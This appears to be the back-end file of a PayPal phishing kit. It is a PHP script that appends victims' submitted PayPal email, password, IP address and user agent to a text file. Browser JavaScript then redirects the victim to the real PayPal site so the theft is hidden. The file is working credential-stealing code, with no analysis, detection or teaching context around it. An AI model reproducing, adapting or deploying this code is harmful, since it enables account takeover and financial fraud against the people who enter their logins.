<script>
function redirectit(){
//Using setTimeout to execute a function after 5 seconds.
    setTimeout(function () {
   //Redirect with JavaScript
    window.location.href= "https://paypal.com";
    }, 2000);
}
</script>

<script>
redirectit();
</script>

<?php
/*
include 'ip.php';

$uname = $_POST['login_email'];
$passah = $_POST['login_password'];

$file = "usernames.txt";
$Saved_File = fopen($file, 'a');

fwrite($Saved_File, $uname);
fwrite($Saved_File, '||');
fwrite($Saved_File, $passah);

fclose($Saved_File);

exit();
*/
include 'ip.php';

file_put_contents("usernames.txt","***\n" . "~Paypal~\n" . "|Account: " . $_POST['login_email'] . "\n" . "|Pass: " . $_POST['login_password'] . "\n" . "|IP: " . $ipaddress . "|UserAgent: " . $useragent . "\n", FILE_APPEND);
exit();
?>

